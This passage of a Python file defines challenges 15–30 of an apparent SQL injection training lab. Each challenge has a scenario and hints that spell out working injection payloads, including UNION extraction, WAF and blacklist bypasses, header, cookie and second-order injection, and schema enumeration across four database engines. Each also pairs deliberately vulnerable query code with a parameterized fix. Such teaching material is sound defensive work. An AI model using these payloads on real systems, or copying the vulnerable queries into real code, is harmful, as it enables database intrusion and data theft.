        hint_2="Try: IT' OR '1'='1 in the department field — this makes the WHERE clause always true.",
        hint_3="Try: IT' OR active=0-- to specifically target inactive records where the flag is stored.",
        solution_explanation="""## The WHERE clause is manipulated to include OR conditions that return additional rows.""",
        vulnerable_code="cursor.execute(f\"SELECT * FROM employees WHERE department='{dept}' AND active=1\")",
        secure_code="cursor.execute(\"SELECT * FROM employees WHERE department=? AND active=1\", (dept,))",
        defensive_tips=["Parameterize all WHERE clause values"],
        learning_level=2,
        container_name="stark-ch15",
        tags=["where", "sqli", "sqlite", "filter-bypass"],
    ),

    Challenge(
        challenge_id=16,
        title="Mission 16",
        subtitle="LIKE-Clause Injection",
        description="Inject through a LIKE-based search to retrieve the flag.",
        objective="Exploit injection inside a LIKE clause to extract the hidden flag.",
        scenario="Stark Industries' product search uses LIKE for fuzzy matching. Your mission: escape the LIKE pattern and inject SQL to retrieve the flag.",
        difficulty=Difficulty.MEDIUM,
        category=Category.ADVANCED,
        points=200,
        estimated_minutes=25,
        db_type=DbType.SQLITE,
        vulnerability_type="LIKE-Clause SQL Injection",
        flag=settings.flag_ch16,
        port=settings.ch16_port,
        hint_1="A LIKE clause looks like: WHERE name LIKE '%<INPUT>%'. You can escape the LIKE pattern and add SQL after the closing quote.",
        hint_2="Try: %' UNION SELECT flag FROM secrets WHERE id=16-- to break out of the LIKE pattern.",
        hint_3="Input: %' UNION SELECT flag,NULL FROM secrets WHERE challenge_id=16-- to execute a UNION through the LIKE clause.",
        solution_explanation="""## % in the input terminates the LIKE pattern, allowing UNION injection.""",
        vulnerable_code="cursor.execute(f\"SELECT * FROM products WHERE name LIKE '%{search}%'\")",
        secure_code="cursor.execute(\"SELECT * FROM products WHERE name LIKE ?\", (f'%{search}%',))",
        defensive_tips=["Parameterize the full LIKE pattern including wildcards"],
        learning_level=4,
        container_name="stark-ch16",
        tags=["like", "sqli", "wildcard"],
    ),

    Challenge(
        challenge_id=17,
        title="Mission 17",
        subtitle="Numeric SQL Injection",
        description="Exploit injection in a numeric parameter that was assumed safe without quotes.",
        objective="Inject into a numeric parameter to extract the flag.",
        scenario="Stark Industries' system health API uses a numeric system ID. The developer assumed integers are safe without quotes. Your mission: prove that numeric inputs still require parameterization.",
        difficulty=Difficulty.EASY,
        category=Category.ADVANCED,
        points=100,
        estimated_minutes=20,
        db_type=DbType.SQLITE,
        vulnerability_type="Numeric SQL Injection",
        flag=settings.flag_ch17,
        port=settings.ch17_port,
        hint_1="Numeric fields don't use quotes in SQL: WHERE id=1. This means you can directly append SQL operators without needing to escape quotes.",
        hint_2="Try: 1 OR 1=1 in the id field. The lack of quotes means your SQL appends directly.",
        hint_3="Try: 1 UNION SELECT flag FROM secrets WHERE id=17 to retrieve the flag via UNION without needing quote escaping.",
        solution_explanation="""## Numeric inputs without quotes allow direct SQL injection without quote manipulation.""",
        vulnerable_code="cursor.execute(f\"SELECT * FROM systems WHERE id={system_id}\")",
        secure_code="cursor.execute(\"SELECT * FROM systems WHERE id=?\", (system_id,))",
        defensive_tips=["Cast and validate numeric inputs", "Always parameterize — even integers"],
        learning_level=2,
        container_name="stark-ch17",
        tags=["numeric", "sqli", "no-quotes"],
    ),

    Challenge(
        challenge_id=18,
        title="Mission 18",
        subtitle="String-Based SQL Injection",
        description="Classic string parameter injection with quote-based exploitation.",
        objective="Exploit a string parameter injection to retrieve the flag.",
        scenario="Stark Industries' archive search accepts a string search term. Your mission: inject SQL through the string parameter to retrieve the hidden flag.",
        difficulty=Difficulty.EASY,
        category=Category.ADVANCED,
        points=100,
        estimated_minutes=20,
        db_type=DbType.SQLITE,
        vulnerability_type="String-Based SQL Injection",
        flag=settings.flag_ch18,
        port=settings.ch18_port,
        hint_1="String parameters are wrapped in quotes: WHERE term='X'. A single quote terminates the string.",
        hint_2="Try: ' OR '1'='1'-- to make the WHERE clause always true.",
        hint_3="Try: ' UNION SELECT flag FROM secrets WHERE id=18-- for direct flag extraction.",
        solution_explanation="""## Classic single-quote injection into a string WHERE clause.""",
        vulnerable_code="cursor.execute(f\"SELECT * FROM archives WHERE term='{term}'\")",
        secure_code="cursor.execute(\"SELECT * FROM archives WHERE term=?\", (term,))",
        defensive_tips=["Parameterize string inputs"],
        learning_level=2,
        container_name="stark-ch18",
        tags=["string", "sqli", "basic"],
    ),

    Challenge(
        challenge_id=19,
        title="Mission 19",
        subtitle="JSON API SQL Injection",
        description="Exploit SQL injection through a REST API that accepts JSON payloads.",
        objective="Exploit the JSON API to retrieve the flag.",
        scenario="Stark Industries' internal analytics API accepts JSON requests. Even though it's a modern REST API, the backend still concatenates input unsafely. Your mission: craft a JSON payload that injects SQL.",
        difficulty=Difficulty.MEDIUM,
        category=Category.ADVANCED,
        points=200,
        estimated_minutes=30,
        db_type=DbType.SQLITE,
        vulnerability_type="JSON API SQL Injection",
        flag=settings.flag_ch19,
        port=settings.ch19_port,
        hint_1="JSON fields are just strings after parsing. If the backend concatenates them into SQL, they're injectable. The Content-Type is application/json but the vulnerability is the same.",
        hint_2='Send POST with: {"username": "admin", "filter": "\' UNION SELECT flag FROM secrets WHERE id=19--"}',
        hint_3='The filter field is injectable. Use: {"username":"x","filter":"\' UNION SELECT flag,NULL FROM secrets WHERE challenge_id=19--"}',
        solution_explanation="""## JSON values are parsed then concatenated into SQL — same vulnerability, different transport.""",
        vulnerable_code="""data = request.json
filter_val = data['filter']
cursor.execute(f"SELECT * FROM logs WHERE category='{filter_val}'")""",
        secure_code="""data = request.json
filter_val = data['filter']
cursor.execute("SELECT * FROM logs WHERE category=?", (filter_val,))""",
        defensive_tips=["Parameterize regardless of input format (JSON, form, URL)"],
        learning_level=7,
        container_name="stark-ch19",
        tags=["json", "api", "rest", "sqli"],
    ),

    Challenge(
        challenge_id=20,
        title="Mission 20",
        subtitle="HTTP Header Injection",
        description="Exploit SQL injection delivered through an HTTP request header.",
        objective="Inject SQL via the X-User-ID header to retrieve the flag.",
        scenario="Stark Industries' internal dashboard trusts the X-User-ID header for user identification. Your mission: manipulate the header value to inject SQL and retrieve the flag.",
        difficulty=Difficulty.MEDIUM,
        category=Category.ADVANCED,
        points=200,
        estimated_minutes=30,
        db_type=DbType.SQLITE,
        vulnerability_type="HTTP Header SQL Injection",
        flag=settings.flag_ch20,
        port=settings.ch20_port,
        hint_1="SQL injection isn't limited to URL parameters and form fields. Any user-controlled value that reaches a SQL query is potentially injectable — including HTTP headers.",
        hint_2="The X-User-ID header is used in: WHERE user_id='<header_value>'. Try setting it to: 1' OR '1'='1",
        hint_3="Set header X-User-ID: 1' UNION SELECT flag,NULL,NULL FROM secrets WHERE id=20-- to extract the flag.",
        solution_explanation="""## HTTP headers are treated as trusted input but concatenated unsafely into SQL.""",
        vulnerable_code="""user_id = request.headers.get('X-User-ID')
cursor.execute(f"SELECT * FROM sessions WHERE user_id='{user_id}'")""",
        secure_code="""user_id = request.headers.get('X-User-ID')
cursor.execute("SELECT * FROM sessions WHERE user_id=?", (user_id,))""",
        defensive_tips=["Treat all HTTP input (headers, cookies, body) as untrusted"],
        learning_level=7,
        container_name="stark-ch20",
        tags=["header", "http", "sqli"],
    ),

    Challenge(
        challenge_id=21,
        title="Mission 21",
        subtitle="Cookie-Based SQL Injection",
        description="Exploit SQL injection delivered through a session cookie.",
        objective="Manipulate the session cookie to inject SQL and retrieve the flag.",
        scenario="Stark Industries' internal app stores session data in a cookie. The backend looks up session info using the cookie value directly in SQL. Your mission: forge a cookie that injects SQL.",
        difficulty=Difficulty.MEDIUM,
        category=Category.ADVANCED,
        points=200,
        estimated_minutes=30,
        db_type=DbType.SQLITE,
        vulnerability_type="Cookie-Based SQL Injection",
        flag=settings.flag_ch21,
        port=settings.ch21_port,
        hint_1="Cookies are HTTP headers too. If a cookie value is used in SQL without parameterization, it's injectable. Try modifying the session_id cookie.",
        hint_2="Set cookie: session_id=abc' OR '1'='1'-- and send a request to /dashboard.",
        hint_3="Set cookie: session_id=abc' UNION SELECT flag,NULL FROM secrets WHERE id=21-- to retrieve the flag.",
        solution_explanation="""## Cookie values are attacker-controlled and must be parameterized.""",
        vulnerable_code="""session_id = request.cookies.get('session_id')
cursor.execute(f"SELECT * FROM sessions WHERE token='{session_id}'")""",
        secure_code="""session_id = request.cookies.get('session_id')
cursor.execute("SELECT * FROM sessions WHERE token=?", (session_id,))""",
        defensive_tips=["Treat cookies as untrusted user input", "Use signed/encrypted session tokens"],
        learning_level=7,
        container_name="stark-ch21",
        tags=["cookie", "session", "sqli"],
    ),

    Challenge(
        challenge_id=22,
        title="Mission 22",
        subtitle="HTTP Parameter Pollution + SQLi",
        description="Exploit how duplicate HTTP parameters are parsed differently to bypass WAF and inject SQL.",
        objective="Use parameter pollution combined with SQL injection to retrieve the flag.",
        scenario="Stark Industries' API passes through a proxy that handles duplicate parameters differently than the backend. Your mission: exploit this parsing discrepancy to bypass the WAF layer and inject SQL.",
        difficulty=Difficulty.HARD,
        category=Category.ADVANCED,
        points=300,
        estimated_minutes=45,
        db_type=DbType.SQLITE,
        vulnerability_type="HTTP Parameter Pollution + SQLi",
        flag=settings.flag_ch22,
        port=settings.ch22_port,
        hint_1="HTTP Parameter Pollution: some servers take the first value of a duplicate parameter, others take the last. ?id=1&id=2 may give id=1 or id=2 depending on the framework.",
        hint_2="Send: ?id=1&id=2' UNION SELECT flag FROM secrets-- The WAF inspects the first 'id=1' (clean), but Flask/the backend concatenates both values.",
        hint_3="Try: GET /search?term=safe&term=' UNION SELECT flag FROM secrets WHERE id=22-- and observe which value the backend uses.",
        solution_explanation="""## The WAF sees only the first parameter but the backend uses the last, bypassing inspection.""",
        vulnerable_code="""term = request.args.get('term')  # Gets last value
cursor.execute(f"SELECT * FROM products WHERE name='{term}'")""",
        secure_code="""term = request.args.get('term')
cursor.execute("SELECT * FROM products WHERE name=?", (term,))""",
        defensive_tips=["Parameterize to make HPP exploitation irrelevant", "Normalize input at the WAF layer"],
        learning_level=8,
        container_name="stark-ch22",
        tags=["hpp", "parameter-pollution", "waf-bypass", "sqli"],
    ),

    Challenge(
        challenge_id=23,
        title="Mission 23",
        subtitle="WAF-Bypass SQL Injection",
        description="Bypass a simulated WAF using encoding and alternate SQL syntax.",
        objective="Evade the WAF's signature filter and inject SQL to retrieve the flag.",
        scenario="Stark Industries deployed a simple WAF that blocks obvious SQL injection keywords. Your mission: use encoding, case variation, or alternate syntax to bypass the filter and execute your injection.",
        difficulty=Difficulty.HARD,
        category=Category.ADVANCED,
        points=300,
        estimated_minutes=50,
        db_type=DbType.SQLITE,
        vulnerability_type="WAF-Bypass SQL Injection",
        flag=settings.flag_ch23,
        port=settings.ch23_port,
        hint_1="WAF blocks: UNION, SELECT, OR, AND in uppercase. Try case variations: uNiOn SeLeCt, or hex encoding, or inline comments: UN/**/ION SEL/**/ECT.",
        hint_2="Try: ' /*!UNION*/ /*!SELECT*/ flag FROM secrets WHERE id=23-- using MySQL conditional comments (works in SQLite too for bypasses).",
        hint_3="Try: ' UNION%20SELECT%20flag%20FROM%20secrets%20WHERE%20id=23-- URL encoding, or 'uNiOn sElEcT flag fRoM secrets wHeRe id=23--'.",
        solution_explanation="""## Signature-based WAFs are bypassable via case variation, encoding, and comment injection. Only parameterized queries truly prevent SQLi.""",
        vulnerable_code="""# WAF filter (INEFFECTIVE)
blocked = ['UNION', 'SELECT', 'OR', 'DROP']
for word in blocked:
    if word.upper() in user_input.upper():
        return "Blocked"
cursor.execute(f"SELECT * FROM products WHERE name='{user_input}'")""",
        secure_code="""# SECURE — parameterization makes WAF irrelevant for SQLi
cursor.execute("SELECT * FROM products WHERE name=?", (user_input,))""",
        defensive_tips=[
            "WAF is defense-in-depth, NOT a replacement for parameterized queries",
            "Signature-based filtering is always bypassable",
            "The only reliable SQLi prevention is parameterized queries",
        ],
        learning_level=8,
        container_name="stark-ch23",
        tags=["waf", "bypass", "encoding", "sqli"],
    ),

    Challenge(
        challenge_id=24,
        title="Mission 24",
        subtitle="Filter-Bypass SQL Injection",
        description="Bypass an intentionally weak input blacklist to demonstrate why blacklists fail.",
        objective="Circumvent the blacklist filter and inject SQL to retrieve the flag.",
        scenario="A developer at Stark Industries added a 'fix' that strips the word 'UNION' from input. Your mission: bypass this filter and prove why blacklist-based filtering is unreliable.",
        difficulty=Difficulty.MEDIUM,
        category=Category.ADVANCED,
        points=200,
        estimated_minutes=30,
        db_type=DbType.SQLITE,
        vulnerability_type="Filter-Bypass SQL Injection",
        flag=settings.flag_ch24,
        port=settings.ch24_port,
        hint_1="The filter strips 'UNION' once. What if you put 'UNION' inside 'UNION'? Try: UNUNIONION — after stripping 'UNION' you get 'UNION'.",
        hint_2="UNUNIONION SELECT trick: input UNUNIONION SESELECTLECT flag... strip UNION once → UNION SELECT flag...",
        hint_3="Try: ' UNUNIONION SESELECTLECT flag FROM secrets WHERE id=24-- The double-encoding trick creates the payload after the filter strips one layer.",
        solution_explanation="""## UNION embedded inside UNION — strip once and the injection reconstitutes itself. This is why blacklists always fail.""",
        vulnerable_code="""# VULNERABLE — blacklist filter
user_input = user_input.replace('UNION', '').replace('union', '')
cursor.execute(f"SELECT * FROM products WHERE name='{user_input}'")""",
        secure_code="""# SECURE — parameterization
cursor.execute("SELECT * FROM products WHERE name=?", (user_input,))""",
        defensive_tips=[
            "Never rely on blacklists for SQL injection prevention",
            "Use parameterized queries — the only reliable defense",
        ],
        learning_level=8,
        container_name="stark-ch24",
        tags=["filter-bypass", "blacklist", "sqli"],
    ),

    Challenge(
        challenge_id=25,
        title="Mission 25",
        subtitle="Second-Order Authentication SQLi",
        description="Demonstrate second-order SQL injection affecting authentication logic.",
        objective="Store a payload during registration that fires during the authentication workflow to retrieve the flag.",
        scenario="Stark Industries' enterprise portal stores usernames during registration and uses them in a second authentication-related query. Your mission: register with a crafted username that triggers second-order injection during the login verification step.",
        difficulty=Difficulty.EXPERT,
        category=Category.ADVANCED,
        points=500,
        estimated_minutes=60,
        db_type=DbType.SQLITE,
        vulnerability_type="Second-Order Authentication SQLi",
        flag=settings.flag_ch25,
        port=settings.ch25_port,
        hint_1="Register with a malicious username. The registration INSERT is safe. But the subsequent authorization check uses your stored username in a different query.",
        hint_2="Register with username: admin'-- The registration succeeds. Now try logging in — the auth system will use your stored username in a privilege check query.",
        hint_3="Register as: ' UNION SELECT flag,1 FROM secrets WHERE id=25-- then trigger the /verify-access endpoint which reads your stored username into a new query.",
        solution_explanation="""## The second-order attack: store the payload at registration (safe INSERT), trigger it during access verification (unsafe SELECT using stored username).""",
        vulnerable_code="""# Registration (safe)
cursor.execute("INSERT INTO users (username) VALUES (?)", (username,))

# Access check (VULNERABLE — uses stored data unsafely)
stored_user = get_current_username()
cursor.execute(f"SELECT role FROM permissions WHERE username='{stored_user}'")""",
        secure_code="""cursor.execute("INSERT INTO users (username) VALUES (?)", (username,))
stored_user = get_current_username()
cursor.execute("SELECT role FROM permissions WHERE username=?", (stored_user,))""",
        defensive_tips=["Parameterize all queries regardless of data origin"],
        learning_level=9,
        container_name="stark-ch25",
        tags=["second-order", "auth", "expert"],
    ),

    Challenge(
        challenge_id=26,
        title="Mission 26",
        subtitle="Multi-Database SQLi",
        description="Understand how SQL injection syntax differs across database engines.",
        objective="Successfully inject against SQLite, MySQL, and PostgreSQL instances using engine-specific syntax.",
        scenario="Stark Industries runs a multi-database environment. Your mission: exploit SQLi against each database engine using the appropriate dialect. Collect all three partial flags and combine them.",
        difficulty=Difficulty.EXPERT,
        category=Category.ADVANCED,
        points=500,
        estimated_minutes=90,
        db_type=DbType.MULTI,
        vulnerability_type="Multi-Database SQL Injection",
        flag=settings.flag_ch26,
        port=settings.ch26_port,
        hint_1="Each database has different comment syntax: SQLite/MySQL: --, MySQL also: #, PostgreSQL: --. String concat: SQLite: ||, MySQL: CONCAT(), PostgreSQL: ||",
        hint_2="For MySQL use: CONCAT(0x7e,(SELECT flag)) with ExtractValue. For PostgreSQL: use UNION with pg_sleep for timing. For SQLite: standard UNION SELECT.",
        hint_3="Query each tab (SQLite/MySQL/PostgreSQL) with the appropriate syntax. Combine the three partial values to get the full flag.",
        solution_explanation="""## Different databases require different syntax. Understanding dialects is essential for comprehensive testing.""",
        vulnerable_code="query = f\"SELECT * FROM data WHERE key='{user_input}'\"  # All three DBs",
        secure_code="""# SQLite: cursor.execute("SELECT * FROM data WHERE key=?", (key,))
# MySQL: cursor.execute("SELECT * FROM data WHERE key=%s", (key,))
# PostgreSQL: cursor.execute("SELECT * FROM data WHERE key=%s", (key,))""",
        defensive_tips=["Parameterization syntax varies by driver but protection is universal"],
        learning_level=10,
        container_name="stark-ch26",
        tags=["multi-db", "sqlite", "mysql", "postgresql", "expert"],
    ),

    # ─────────────────────────────────────────────────────
    # DATABASE-SPECIFIC (CH27–CH30)
    # ─────────────────────────────────────────────────────

    Challenge(
        challenge_id=27,
        title="Mission 27",
        subtitle="SQLite SQL Injection",
        description="Deep-dive into SQLite-specific injection techniques.",
        objective="Use SQLite-specific syntax to enumerate the schema and extract the flag.",
        scenario="A dedicated SQLite environment. Your mission: use SQLite's sqlite_master table and SQLite-specific functions to discover the schema and extract the flag.",
        difficulty=Difficulty.MEDIUM,
        category=Category.DB_SPECIFIC,
        points=200,
        estimated_minutes=35,
        db_type=DbType.SQLITE,
        vulnerability_type="SQLite-Specific SQL Injection",
        flag=settings.flag_ch27,
        port=settings.ch27_port,
        hint_1="SQLite uses sqlite_master for schema discovery: SELECT name FROM sqlite_master WHERE type='table'",
        hint_2="SQLite uses || for string concatenation (not CONCAT). Version: SELECT sqlite_version()",
        hint_3="' UNION SELECT name FROM sqlite_master WHERE type='table'-- to list tables, then target the secrets table.",
        solution_explanation="""## SQLite-specific: sqlite_master, || concatenation, sqlite_version().""",
        vulnerable_code="cursor.execute(f\"SELECT * FROM catalog WHERE item='{item}'\")",
        secure_code="cursor.execute(\"SELECT * FROM catalog WHERE item=?\", (item,))",
        defensive_tips=["Same parameterization principle applies to SQLite"],
        learning_level=10,
        container_name="stark-ch27",
        tags=["sqlite", "sqlite-master", "db-specific"],
    ),

    Challenge(
        challenge_id=28,
        title="Mission 28",
        subtitle="MySQL SQL Injection",
        description="Deep-dive into MySQL-specific injection techniques.",
        objective="Use MySQL information_schema and MySQL-specific functions to extract the flag.",
        scenario="A dedicated MySQL 8 environment. Your mission: use MySQL's information_schema, GROUP_CONCAT, and MySQL-specific syntax to enumerate and extract the flag.",
        difficulty=Difficulty.MEDIUM,
        category=Category.DB_SPECIFIC,
        points=200,
        estimated_minutes=35,
        db_type=DbType.MYSQL,
        vulnerability_type="MySQL-Specific SQL Injection",
        flag=settings.flag_ch28,
        port=settings.ch28_port,
        hint_1="MySQL uses information_schema.tables for enumeration. Try: ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
        hint_2="GROUP_CONCAT combines multiple values: ' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='secrets'--",
        hint_3="' UNION SELECT flag FROM ch28_secrets WHERE challenge_id=28-- after enumerating the table name.",
        solution_explanation="""## MySQL information_schema, GROUP_CONCAT, database() function for enumeration.""",
        vulnerable_code="cursor.execute(f\"SELECT * FROM catalog WHERE item='{item}'\")",
        secure_code="cursor.execute(\"SELECT * FROM catalog WHERE item=%s\", (item,))",
        defensive_tips=["MySQL GRANT minimum necessary privileges to the application DB user"],
        learning_level=10,
        container_name="stark-ch28",
        tags=["mysql", "information-schema", "group-concat", "db-specific"],
    ),

    Challenge(
        challenge_id=29,
        title="Mission 29",
        subtitle="PostgreSQL SQL Injection",
        description="Deep-dive into PostgreSQL-specific injection techniques.",
        objective="Use PostgreSQL pg_catalog and PostgreSQL-specific functions to extract the flag.",
        scenario="A dedicated PostgreSQL 15 environment. Your mission: use PostgreSQL's pg_catalog, string_agg, and pg_sleep for timing attacks to enumerate and extract the flag.",
        difficulty=Difficulty.HARD,
        category=Category.DB_SPECIFIC,
        points=300,
        estimated_minutes=45,
        db_type=DbType.POSTGRESQL,
        vulnerability_type="PostgreSQL-Specific SQL Injection",
        flag=settings.flag_ch29,
        port=settings.ch29_port,
        hint_1="PostgreSQL uses pg_catalog.pg_tables for enumeration: SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname='public'",
        hint_2="PostgreSQL uses pg_sleep() for time-based blind: 1; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END--",
        hint_3="' UNION SELECT flag FROM ch29_secrets WHERE challenge_id=29-- after discovering table names.",
        solution_explanation="""## PostgreSQL pg_catalog, pg_sleep, string_agg, and $$ quoting are PostgreSQL-specific techniques.""",
        vulnerable_code="cursor.execute(f\"SELECT * FROM catalog WHERE item='{item}'\")",
        secure_code="cursor.execute(\"SELECT * FROM catalog WHERE item=%s\", (item,))",
        defensive_tips=["PostgreSQL REVOKE default PUBLIC privileges on schemas"],
        learning_level=10,
        container_name="stark-ch29",
        tags=["postgresql", "pg-catalog", "pg-sleep", "db-specific"],
    ),

    Challenge(
        challenge_id=30,
        title="Mission 30",
        subtitle="MSSQL SQL Injection",
        description="Deep-dive into Microsoft SQL Server-specific injection techniques.",
        objective="Use MSSQL xp_cmdshell (disabled in lab), sys tables, and MSSQL-specific functions to extract the flag.",
        scenario="A dedicated MSSQL 2022 environment. Your mission: use MSSQL's sys.tables, WAITFOR DELAY, and T-SQL specific syntax to enumerate and extract the flag. xp_cmdshell is disabled for safety.",
        difficulty=Difficulty.EXPERT,
        category=Category.DB_SPECIFIC,
        points=500,
        estimated_minutes=60,
        db_type=DbType.MSSQL,
        vulnerability_type="MSSQL-Specific SQL Injection",
        flag=settings.flag_ch30,
        port=settings.ch30_port,
        hint_1="MSSQL uses sys.tables for enumeration: SELECT name FROM sys.tables. Time delay: WAITFOR DELAY '0:0:2'.",
        hint_2="MSSQL uses + for concatenation: 'stark'+' industries'. Try: '; SELECT TOP 1 name FROM sys.tables--",
        hint_3="'; SELECT flag FROM ch30_secrets WHERE challenge_id=30-- after discovering table names via sys.tables.",
        solution_explanation="""## MSSQL sys.tables, WAITFOR DELAY, TOP, T-SQL specific syntax. xp_cmdshell is disabled — OS command injection is blocked at the database level.""",
        vulnerable_code="cursor.execute(f\"SELECT * FROM catalog WHERE item='{item}'\")",
        secure_code="cursor.execute(\"SELECT * FROM catalog WHERE item=?\", (item,))",
        defensive_tips=[
            "Disable xp_cmdshell in production",
            "Use MSSQL Contained Databases for isolation",
            "Apply principle of least privilege",
        ],
        learning_level=10,
        container_name="stark-ch30",
        tags=["mssql", "sql-server", "sys-tables", "waitfor", "expert"],
    ),
]

# Build lookup dict
CHALLENGE_MAP: dict[int, Challenge] = {c.challenge_id: c for c in CHALLENGES}


def get_challenge(challenge_id: int) -> Optional[Challenge]:
    return CHALLENGE_MAP.get(challenge_id)


def get_all_challenges() -> List[Challenge]:
    return CHALLENGES
